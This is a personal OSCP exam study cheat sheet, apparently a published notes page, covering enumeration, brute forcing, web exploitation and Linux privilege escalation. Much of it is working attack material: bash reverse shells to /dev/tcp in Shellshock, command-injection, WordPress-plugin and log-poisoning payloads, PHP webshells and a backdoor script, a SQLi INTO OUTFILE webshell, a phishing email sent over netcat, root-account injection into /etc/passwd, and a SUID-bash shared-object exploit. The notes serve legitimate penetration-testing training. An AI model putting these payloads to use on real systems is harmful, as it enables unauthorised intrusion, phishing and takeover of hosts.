---
layout: custom
title: OSCP Notes
permalink: /oscp_notes/
---
# Enumeration
## (0) nmap
Starting commands:
1. `sudo nmap -p- -v -T4 $IP` to reveal `$port1`, `$port2`, and so on
2. Then: `sudo nmap -sC -A -p$port1,$port2,etc $IP -T4`

- `sudo nmap -v -p- -sC -sV -T4 192.168.100.101` (Checks all ports)(T4/5 for additional speed)(-Pn to assume host is up)
- `sudo nmap -v -p- -sC -sV 192.168.100.101 -T4 -oN openports.txt && grep '/tcp' openports.txt | cut -d '/' -f 1 | paste -sd ','` (faster and echos open ports)
- `sudo nmap -sU 192.168.100.101` (Checks UDP ports specifically)

nmap flags:
-sS (SYN Scan)
-sU (UDP Scan)
-sT (TCP Scan)
-sV (Version enum)
-O (OS Fingerprinting)
-Pn (Assume host is up)
-p (Ports)
-A (runs all scans)
-n (No DNS)
-T 0-5 (Timing of scans, 0 is fastest, 3 is default)

### Print Open Ports (test)
- Print open ports: `nmap $Ip |  grep '/tcp' | cut -d '/' -f 1 | paste -sd ','`
- include the standard output in a file (scan.txt) and also the ports in a second line
`nmap $Ip -oN scan.txt && grep '/tcp' scan.txt | cut -d '/' -f 1 | paste -sd ','`
- no file creating
`output=$(nmap 192.168.247.122); echo "$output"; echo -n "Ports: "; echo "$output" | grep '/tcp' | cut -d '/' -f 1 | paste -sd ','`

### Scripting Engine
- Nmap Scripting Engine
	- The nmap scripting engine can also be used for more thorough scanning
	- Ex: `nmap --script=$script1.nse, $script2.nse $IP`
	- Find scripts: `ls /usr/share/nmap/scripts| grep $searchTerm`
	- Help on script: `nmap --script-help=$script.nse`
	- Run wildcard script: `sudo nmap --script=smb* -p 445 -Pn $IP`
	- Useful scripts from QuirkyKirkHax:
		- smb-os-discovery
		- snmp-brute * (hydra might be better)
		- smtp-brute
		- smtp-commands
		- smtp-enum-users

### nmapautomator
- https://github.com/21y4d/nmapAutomator
- `./nmapAutomator.sh --host $Ip --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)

## (21) FTP
With no creds:
- `ftp anonymous@192.168.100.101`
- `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ftp`

With a username:
- `hydra -l $user -P passwords.txt 192.168.100.101 ftp`

With a password:
-` hydra -L usernames.txt -p $password 192.168.100.101 ftp`

## (22) SSH
`ssh -i $key $user@$target`

You can connect to the ssh service via netcat to grab the banner and search the version for OS info.
- `nc -nv $IP 22`

Brute forcing:
With no creds:
- `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ssh`

With a username:
- `hydra -l $user -P passwords.txt 192.168.100.101 ssh`

With a passwords:
-` hydra -L usernames.txt -p $password 192.168.100.101 ssh`

Useful nmap scripts:
ssl-heartbleed.nse

## (25) SMTP
Commands:
- VRFY command tells if an email address exists.
- EXPN command shows membership of mailing list
- RCPT (you'll need a valid email for this for an exploit)

### smtp-user-enum
- To verify usernames: `smtp-user-enum -M VRFY -U users.txt -t $host` 
	- host is IP or hostname
- `smtp-user-enum -M EXPN -u $username -t $host`
- `smtp-user-enum -M RCPT -U users.txt -T $hostlist`
- `smtp-user-enum -M EXPN -D $domain -U users.txt -t $host`

### Swaks
Swaks (Sending email from command line when you have creds for mail server)
- `swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server <mail server ip> --body "message" --header "Subject: Subject" --suppress-data`
	- You will need the password of the mail server user (likely the sender)
	- Note that the mail server may not be the same machine as the user who opens the email

### Send email over NC
pop@kali--[~/PG/Postfish]$
1. `nc -v $host 25`
2. `helo pop`
3. `MAIL FROM: user@domain` (this may not need to be a real user)
4. `RCPT TO: targetUser@domaain` (does need to be real)
5. `DATA`
6. ```
   Subject: RE: password reset

Hi user, 

Click this link or your skip manager gets it - http://192.168.45.235/

Ragrads, 

.```
7. `QUIT`
8. `Bye`

## (53) DNS

DNS Enumeration might give you information on other hosts in the network.
Keep in mind, you will probably have to mess with /etc/conf for this!!!

If you are looking for DNS servers specifically, use nmap to quickly and easily search:
`nmap -sU -p53 ​$network`

Normal DNS Query:
`nslookup ​$IP`

Query for MX Servers within a domain:
`dig ​$domain ​MX`

Query for Name Servers within a domain:
`dig ​$domain ​NS`

DNS Zone Transfer (This will give you all of the marbles!)
`dig axfr @​$nameServer $domain`
`dnsrecon -d ​domain ​-a --name_server ​server`

If you want to brute force subdomain enum, try dnsmap:
`dnsmap ​$domain`

## (80,443,8080, etc.) Web Servers
### Directory Scanning
#### Gobuster
- `gobuster dir -u $URL -w /usr/share/wordlists/$wordlist.txt -t 5 -x .php, .txt -o results.txt`
	- Where `-o` the resulting output is called results.txt
	- Where `-x` checks for those extensions
- EX: `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5`
- EX: `gobuster dir -u http://$IP/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k`
- Dirb is recursive - EX: `dirb http://$IP -z 10`

#### feroxbuster 
-`feroxbuster -u $URL`
- `feroxbuster -u $URL -w $wordlist`
- `feroxbuster -u $URL -t $numberOfThreads`
- `feroxbuster -u $URL --timeout $timeoutInSeconds`
- `feroxbuster -u $URL --filter-status 404,403,400 --thorough -r`
- `feroxbuster -u $URL:$alternatePort

#### Nikto
- `nikto -h http://foo.com -port 8000`

#### Subdomains with wfuzz
`wfuzz -c -f sub-fighter -w $wordlist -u 'domain.com' -H "Host: FUZZ.domain.com"
- sub-fighter is for subdomains -h 'http'
- For example `/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- `--hw 290`: to remove results with a size of 290
- need to edit /etc/hosts with the subdomain

### General Notes
- Check for robots.txt and sitemap.xml!
- Check for admin consoles for respective apps (MySQL, Tomcat, phpmyadmin, etc)
- Check source
	- Usernames, passwords, IPs of other machines?
	- Any fields to input data for SQLi or XSS 
	- If you find cgi-bin and are forbidden to access it, you can still brute force the cgi names to test for shellshock vuln
		- `gobuster dir -u http://$IP/ -e -s "200,204,403,500" -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt`
		- `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://[IP]/cgi-bin/user.sh`
		- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/53 0>&1' http://$IP/cgi-bin/user.sh`
- Take note of framework and OS the webserver is using.  Might help you know what tools are installed on the system.
- Useful nmap scripts:
	- `http-shellshock --script-args uri=[PATHTOCGI]`
- php://filter and php://data wrappers are gonna be big!

### Directory Traversal
On Linux, we can use the `/etc/passwd` file to test directory traversal vulnerabilities. On Windows, we can use the file `C:\Windows\System32\drivers\etc\hosts` to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
- May need to access these files, `/etc/passwd` through Burp
- Try absolute path, like `/etc/passwd` as well as with traversal sequences like `../../`
- Consider that the `../` maybe be stripped: 
  `/image?filename=....//....//....//etc/passwd` (for if application strips path traversal sequences from the user-supplied filename before using it)
- Encoding:
	  - Without:`../../../etc/passwd`
	  - URL Encoded: `%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd`
	  - Double URL encoded: `%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd`
- If the start of the path is validated for user supplied input: 
	- `image?filename=/var/www/images/../../../../etc/passwd`
- If the application requires the filename to end with an expected file extension:
	- `/image?filename=../../../etc/passwd%00.jpg`
	- The `%00` is a null byte which effectively terminates the file path before the extension. 

### Encoding Notes (not sure)
Examples:	`%20 = " "` and `%5C = "\"` and `%2e = "."` and `%2f = "/"`
- Note: Don't encode the "-" character in flags, and it looks like "/" characters also don't need to be encoded. 
- https://www.urlencoder.org/
- EX: `curl http://$URL$.com/directory/uploads/backdoor.pHP?cmd=type%20..%5C..%5C..%5C..%5Cxampp%5Cpasswords.txt
	- where backdoor is the cmd script in the RFI section below that has already been uploaded to the Windows machine so that we can read the passwords.txt file.
	- When there is a username field, password field, and additional called MFA - From: "&&bash -c "bash -i >& /dev/tcp/192.168.45.179/7171 0>&1""
	- Becomes: `username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"`
	- So make sure to enclose command in `"&&$encondedCommand"` (incl. quotes).

#### LOG POISONING
<?php echo system($_GET['cmd']); ?>
Then submit `&cmd=$command`

#### Shells
- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
- `bash -c "bash -i >& /dev/tcp/$IP/4444 0>&1"`
	- can URL encode
- revshells.com


### Specific Web Servers
#### Apache
This might need to be in the /etc/apache2/apache2.conf file for php to execute:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

#### IIS 
payload = .asp/.aspx shell

`C:\inetpub\wwwroot`
`iisstart.htm` = default welcome page


.htaccess for IIS servers: Similarly, developers can make directory-specific configuration on IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>


### Wordpress

Initial enumeration: `wpscan --url http://$url --api-token $APIToken`
`/wp-admin` is the admin login page.
#### reverse shell Wordpress plugin
If you get into the admin page, you can upload malicious plugins. Plugins are defined as a zip file with 2 php files inside. (This may not be true provided the below syntax info is included in the php exploit file - so one file total with this or two files - one with this and one with the exploit). Syntax below:

	    <?php
	    
	    /**
	    * Plugin Name: Reverse Shell Plugin
	    * Plugin URI:
	    * Description: Reverse Shell Plugin
	    * Version: 1.0
	    * Author: Author Name
	    * Author URI: http://www.website.com
	    */
	    
	    exec("/bin/bash -c 'bash -i >& /dev/tcp/$kaliIP $port 0>&1'");
	    ?>



- The plugin files will be accessible from the following link:
`http://$target/wp-content/plugins/$zipName/$phpFileNmae`

### when the web server won't execute a file type during uploads
1. `echo "AddType application/x-httpd-php .xxx" > .htaccess`
2. upload the .htaccess file
3. then upload the .xxx file which can be executed as php


### PHP Wrappers
Note that in order to exploit these vulnerabilities, the allow_url_include setting needs to be enabled for PHP, which is not the case for default installations. That said, it is included in the material, so it makes sense to be aware of it. 
Ex: exploiting a page called admin.php
-  `curl http://$IP/$directory/index.php?page=admin.php`
-  Note that if the `<body>` tag is not closed (with a `</body>` tag at the end), the page could be vulnerable. Let's try to exploit it with the **php://filter** tag. 
	1. `curl http://$IP/$directory/index.php?page=php://filter/**convert.base64-encode**/resource=admin.php`
		1. This should return the whole page which can then be decoded for further information. 
	2. `echo "$base64Text" | base64 -d`
- Now let's try with the **data://** warpper. 
	1. `curl "http://$IP/$directory/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"`
		1. This shows that we can execute embeeded data via LFI. 
	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
	3. `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
	4. `"http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

## (88) Kerberos
ADD THE DNS NAME TO YOUR `/etc/hosts` FILE!!!

To enumerate accounts ON DC:
`kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`

To check for users on 445 with RPC:
`rpcclient -U "" -N $IP`
	- `enumdomusers`
	- `querygroup 0x200`  
	- `querygroupmem 0x200`
	- `queryuser 0x1f4` 

### Steps 
AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access

### Notes
The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements:
- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required

## (111) NFS

Network File System allows you mount and access files on a remote system as if they were on your local machine.

RPC binds to 111 and you can use that port to enumerate other services using rpc (rpc-info script)

You can then use the nmap scripts to gather as much info on the nfs side as possible.
`nmap -p 111 --script nfs* $IP`

Then you can mount the shared drive to your own machine and dig into it.
`sudo mount -o nolock $IP:/$shareDirectory $localMount`

If you cannot access the file: 
1. you may need to check what UUID is allowed to view the file:
- `ls -l`
2. And then create a new user on your local machine:
- `adduser`
3. Change the UUID of the newly created user:
- `sudo sed -i -e 's/[CURRENTUUID]/[NEWUUID]/g' /etc/passwd`
4. Check and make sure the command ran properly:
- `cat /etc/passwd|grep $user`
5. `su` to the new user and read away.

Useful nmap scripts:
rpc-info.se
nfs-ls.se
nfs-showmount.se
nfs-statfs.se

Enumerate users: `rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";`
- No pass and no user

## SMB

- `nxc smb 192.168.101.100 -u '' -p '' --shares`
- `nxc smb 192.168.101.100 -u '' -p '' --users`
- `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP -Pn` (SambaCry and EternalBlue)

To probe NetBIOS info:
`nbtscan -v ​$IP`
-The hex codes reference different services.  You can look up what they mean, but 20 means File Sharing services.
- http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html

### smbclient
To list what resources are being shared on a system:
- `smbclient -L $IP -N`
	- with no creds
- `smbclient -L $IP -U $user`
- `smbclient //$IP/$shareName -U $user%$password`
- `smbclient //$IP/$shareName -U $user --pw-nt-hash $NTLMHash`
- `smbclient //$IP/$shareName --directory path/to/directory --command "get file.txt"`
	- to download file
- `smbclient //$IP/$shareName --directory path/to/directory --command "put file.txt"`
	- to upload file

To display share information on a system:
- `nmblookup -A ​$IP`

Enum4linux is a great tool to gather information through SMB (note, it tests anonymous login only by default):
- `enum4linux ​$IP`

Brute force using hydra:
`hydra -l $User -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt smb://$IP/ -V -I`   


### to get all files from an smb share
1. `smbclient \\\\$IP\\SYSVOL -U "domain.offsec\$username"`
2. `recurse on`
3. `prompt off`
4. `mget *`
5. `exit`
6. `find . -type f`
	1. This lists all the files you have downloaded into the directory you downloaded them into

### Command Execution with NXC:
- `nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='`
```
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
SMB         10.10.10.10   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:EXAMPLE.com) (signing:True) (SMBv1:False)
SMB         10.10.10.10   445    DC               [+] EXAMPLE.com\Username:Password (Pwn3d!)
SMB         10.10.10.10   445    DC               [-] WMIEXEC: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
```

## SNMP 
### Notes
SNMP is that it operates using community strings which means it sends passwords when it sends data. Can be sniffed with wireshark. 
Versions:
- SNMPv1 is all cleartext, so it is easy to grab the string
- SNMPv2 has some inherent weaknesses allowing it to be grabbed 2
- SNMPv3 is encrypted, but it can be brute forced.

There are 2 kinds of community strings: Public (Read Access) and Private (Write Access).

You can also brute-force the string with nmap or Hydra:
`nmap --script=snmp-brute $targetIP
`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://$targetIP/

But you need community string first:

### onesixtyone
- `onesixtyone -c $(file containing community strings (public, private, manager)) -i $(file containing target ips)
- Note that there are seclists with common community strings
	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
	- SecLists/Miscellaneous/snmp.txt
### snmpwalk
- `snmpwalk -c public -v1 -t 10 $targetIP`: where public is the community string (could be private or mamanger)
- `snmpwalk -c public -v1 192.168.50.151 $OIDString` - for specific info

```
|OID| Target |
|--|--|
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2  | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
```
- `snmpwalk -Os -c public -v 1 $IP system`
	- to retrieve all
	- try 'v 2c' as well 

### Useful Nmap Scripts:
snmp-brute
snmp-win32-services.nse
snmp-win32-shares.nse
snmp-win32-software.nse
snmp-win32-users.nse

### snmpset
You can even overwrite and set some OIDs if things are misconfigured:
`snmpset -c $communityString -v $version $OID $VALUE`

### snmpenum
`snmpenum $targetIP ​$communityString $configFile
- config files are in /usr/share/snmpenum/

## (389,636) LDAP

- if you have ldap and can't find anything else:
`sudo nmap -sC -A -Pn --script "*ldap*" $IP -oN outputfile.txt'` (use output.ldap)

- when you find the dc from the above script which says: "Context: DC=$name,DC=offsec":
`ldapsearch -x -H ldap://$IP -b "dc=$name,dc=offsec" > $name.ldapsearch`  (grep for cn/description/sAMAccountName)
	- This is for when the domain is `$name.offsec`

## mssql
### Commands
- `SELECT @@version;`
- `SELECT name FROM sys.databases;` (to list all available db's)
	- master, tempdb, model, and msdb are default
- `SELECT * FROM \<non-default db>.information_schema.tables;`
	- `select * from \<non-default db>.dbo.\<table>;`
### xp_cmdshell
1. `EXECUTE sp_configure 'show advanced options', 1;`
2. `RECONFIGURE`
3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
4. `RECONFIGURE;`
5. `EXECUTE xp_cmdshell 'whoami';`

## mysql
- From kali: `mysql --host $IP -u root -p$password`
	- note that there is no space between -p flag and $password
- Or from target: `mysql -u $user -p $database` (p flag is db password, have to enter that after)
### Commands
- `select system_user();`
- `select version();`
- `show databases;`
-` SELECT * FROM $tableName WHERE $column='$field;'`

## ~ Brute Forcing
### Hydra
- `hydra -l \<user> -P /usr/share/wordlists/rockyou.txt -s $alternatePort ssh://$IP`
- `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$password" rdp://$IP
- Web page example 1:`hydra -l $user $-P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"`
- Web page example 2: `hydra -l '$username' -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt $IP http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"`
	- -`"$loginpage:$parameters:$failMessage$"`
- Basic Auth: `hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL http-get`

### Hashcat
- `hashcat -m 0 $hashfile /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show`
- `hashcat -m 13400 $keepassHashFile /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show`
- check hashcat for which mode to use (searching for KeePass in this case)
	- `hashcat --help | grep -i "KeePass"`
	- `hashcat -h | grep -i "ssh"`

### john the ripper
- `ssh2john id_rsa > ssh.hash` 
- `keepass2john name.kdbx > keepass1.hash`

### Misc
- If you're using Burp Intruder for anything, make sure to go to options to set custom error message and follow redirects
- There is http-get-form and https-post-form
- Can create a wordlist from a web page using `cewl`
	- `cewl -d -m 3 $URL -w $output.txt`
	- `cewl $URL > pass`
- Generate a username list from names: https://github.com/jseidl/usernamer

## ~ OSINT
1. DNS
	1. netcraft.com
	2. whois
2. Google dorking (filetype:pdf) etc.
3. StackOverflow
4. Shodan (for public facing)
5. Github
6. TheHarvester - automate OSINT on user emails
7. Social Searcher - deep dives on social media
8. https://osintframework.com/
9. Recon-ng

## I'm stuck
Remember: Enumerate deeply, exploit simply.

Did you do all of these?
- `sudo nmap -v -p- -sC -sV 192.168.100.101`
- `sudo nmap -sU 192.168.100.101`
- `nxc smb 192.168.101.100 -u '' -p '' --shares`
- `nxc smb 192.168.101.100 -u '' -p '' --users`
- `nxc ldap 192.168.101.100 -u '' -p '' -M get-desc-users`
- `nxc ldap 192.168.101.100 -u '' -p '' --password-not-required --admin-count --users --groups`
- `enum4linux -a $IP`

### Web Server
Did you fuzz for extensions "--extensions php,rb,txt" in feroxbuster?
Did you check for subdomains too, not just subdirectories?
Did you add your domain name to the `/etc/hosts` file?
If you see a real blog on a lab (as opposed to Lorem Ipsum), read it

### Other Tips
Use `nc` to connect directly with a port to see if you can get any output.  This can grab banners. 

Upload a file to SMB/FTP server to try and execute from the web server

# Exploit
## Buffer Overflow
As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 

For the fields that say "place your shellcode here," such code can be generated using msfvenom like this:
- `msfvenom -p windows/shell_reverse_tcp LHOST=$kaliIP LPORT=443 -f powershell -v sc`
- `msfvenom -p $payload LHOST=$targetIP LPORT=$port EXITFUNC=THREAD -f $format -a $arch --platform $platform -e $encoder > $filename`

### Remember to use try the ports that the target has open


Check for Directory Traversals, LFI and RFI on php pages.
Consider inserting php code into log files and then running LFI exploits to run code.

SAMPLE LFI PHP WRAPPER PAYLOAD:
http://[IP]/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

## LFI
- Executing a file on the server, though we may have to modify it first somehow.  
- Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
	1. Change this: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
	2. To this: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
	3. Then change the request to include "cmd=ls" to test
	4. \<server>/file.php?page=. . / . ./log&cmd=ls 
	- Note that it may need to be URL encoded if your command contains spaces i.e. ls&20-la for "ls -la"
	5. Then one liner shell:
		- `bash -c "bash -i >& /dev/tcp/$kaliIP/$kaliPort 0>&1"`
		- URL encoded though
	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
	- On a Linux target Apache’s access.log file can be found in the /var/log/apache2/ directory.
- There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 

## RFI
- Executing on our file on the server. 
- In PHP web applications, the allow_url_include option needs to be enabled to leverage RFI. This is rare and disabled by default in current versions of PHP
	- [Example backdoor script](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php):
    <?php

	    if(isset($_REQUEST['cmd'])){
	            echo "<pre>";
	            $cmd = ($_REQUEST['cmd']);
	            system($cmd);
	            echo "</pre>";
	            die;
	    }
	    ?>
	- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
	- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"

### Public Exploits
SearchSploit/Exploit-DB
`searchsploit $searchterm`
`searchsploit -x $file 
`searchsploit -m $file` (copies to working directory)
- Exploits for searchsploit are found in `/usr/share/exploitdb/exploits/`

TIPS:
- `SEC_UNKNOWN_ISSUER` error can be bypassed with the `verify=False` param in Python

## SQLi
[Burp Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[Rana Kalil Video playlist](https://www.youtube.com/watch?v=X1X1UdaC_90&list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
[SQLi Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) from Codingo

### See Enumeration Section

### Notes
Goal is to initially find a location for SQLi and hopefully determine what the actual query is
Test possibles injection locations:
- `'`
- `' --`
- `' OR 1=1`
- `' OR 1=1; -- - `
- `'UNION SELECT * FROM users WHERE 1=1; -- -`
- Note that `--` is for comments meaning that everything after that (including what you don't see) will not be included, so if there is another clause, like 'AND variable = 1', it will return everything whether than variable is 1 or 0. 
Ex: `username=administrator'--'&password=password123`
	- This query should be SELECT x FROM y WHERE username = administrator and password = password123
	- But this comments out the last part and will simply SELECT the account of administrator, ignoring whether that was the correct password. 

### UNION SQLi
UNION SELECT - selecting data from an additional table in addition to the intended table

Determine Number of Columns:
1. `$validQuery ORDER by 1`
2. `$validQuery ORDER by 2`
3. and so on until error, then you can form a union statement to chain a second query and see how data is displayed.

Start with `UNION ALL SELECT 1, 2, X`. Then you can determine which column has the most space, making room for more fun commands/exploits (Commands below are based on MariaDB, others might be different)
Enumeration Examples:
- `UNION ALL SELECT 1, 2, @@version`
- `UNION ALL SELECT 1, 2, user ()`
- `UNION ALL SELECT 1, 2, table_name FROM information_schema.tables` - this can grab the table name, like with "users" below
	- Then you can use the table name (users) to reveal other columns:`UNION ALL SELECT 1, 2. column_name FROM information_schema.columns WHERE table_name='users'` 
	- Then you can reveal other info from those columns: `UNION ALL SELECT 1, username, password FROM users`
- `UNION ALL SELECT 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')` - You might be able to use the load_file function to execute code on the system as well:
- `UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'` - using the into OUTFILE to write code, and insert it into the system. 
	- This might present an error, but you could test it with the previous command and see if the file was created.
	- OR you can just run it by trying `$Host/backdoor.php?cmd=$cmd`

### Filter bypass
#### XML encoding
`&#x53;ELECT` instead of `SELECT` to bypass prohibited keywords
- Decoded server-side before being passed to SQL interpreter

## XSS

[Cheatsheet](https://notchxor.github.io/oscp-notes/2-web/xss/) from notchxor.

# Post-Exploit
## After Linux Foothold

### Enumeration 
- `id`
- `sudo -l` - what can we run using sudo
- `history` - could have some juicy details in history
- `cat /etc/passwd`
	- If you can somehow edit /etc/passwd:
	1. `openssl passwd $newPassword`
	2. `echo "$newUser:$hashAbove^:0:0:root:/root:/bin/bash" >> /etc/passwd
		1. or simply copy$hashAbove^ into `root:<this spot>:etc` within the /etc/passwd file
- `uname -a` - kernel exploits
	- `cat /etc/issue`
- `hostname`
- `ps -aux`
	- `watch -n 1 "ps -aux | grep $searchTerm$"`
- `ipconfig`
- `ss -anp or netstat`
- `dpkg -l` (to list applications installed by dpkg)
- `find / -writable -type d 2>/dev/null` (find writable directories)
- `history` or `cat` any `/home/.history` files
- check `/home/.ssh` for keys
- `su root` (can't hurt to try)
- `sudo tcpdump -i lo -A | grep "pass"`
- `ip neigh` - ipv4 neighbor table
- `netstat -ano` - what ports are open and what communications exist
- `dpkg -l` - list installed programs
- check `/var`, `/opt`,  `/usr/local/src` and "`/usr/src/` for anything interesting
- `find / -writable -type d 2>/dev/null ` - find writable directories
- TCM Color Command: `grep --color=auto -rnw '/' -ie "$searchTerm" --color=always 2> /dev/null` (searches for the term  and spits it out in red)


### Privilege Escalation
#### Automated tools
- linpeas.sh
- unix-privesc-check

#### SUID Executables 
SUID stands for “Set User ID”, and it is a special type of permission that can be given to a file so the file is always run with the permissions of the owner instead of the user executing it.
- `find / -user root -perm -4000 -print 2>/dev/null`
- `find / -type f -perm -04000 -ls 2>/dev/null`
- `find / -type f -perm -u=s 2>/dev/null | xargs ls -l`
- `find / -perm -u=s -type f 2>/dev/null`
- `find / -user root -perm -4000 -exec ls -ldb {} \;`
- There may be more
- drwxr-x-r--
	- this is a directory with read/write/execute for the owner, read/execute for the group, and read for everyone else
	- if there is an S where the first x would be, that is a SUID (vs GUID for group id or sticky bit for the last one which would be a t)

#### Kernel Exploits
`uname -a` - check which kernel
`lsmod` - List Kernel modules
- `/sbin/modinfo $moduleName`

#### Passwords and File Permissions
- `history`
- `find /etc -type f -exec grep -i -I "pass" {} /dev/null \;` for the /etc directory
- `find / -name id_rsa 2>/dev/null` or `authorized_keys`

#### Sudo Escalations
- `sudo -l` then "gtfobins.github.io"
- Escalation via LD_PRELOAD - if you see this in the output, it means you can preload libraries, and you can use that to load a bash shell prior to actually executing one of the commands you're able to load. 
	- Code here: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path

#### Scheduled Tasks
Take note of where the PATH is if the full PATH isn't declared
`grep "CRON" /var/log/syslog`
`ls -lah /etc/cron*` 
`cat /etc/crontab`
- especially for processes running as root
- `echo 'ep /bin/bash /tmp/bash; chmod +s /tmp/bash' > $cronScript`
	- then you can execute /tmp bash because of the `+s`

#### Shared Object Injection
`strace $binary 2>&1` - strace intercepts and records the system calls which are called by a process and the signals which are received by a process.
- then try to overwrite anything that shows up as (No such file or directory)
- may need a .c file to exploit, EX:
	
	#include <stdio.h>
	#include <stdlib.h>

	static void inject() __attribute__((constructor));

	void inject() {
		system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
	}
	
- then `gcc -shared -fPIC -o $outputLocation $exploitLocation.c`
- `gcc -shared -fPIC -nostartfiles -o file file.c`
- note that you can change this to `$file.so`

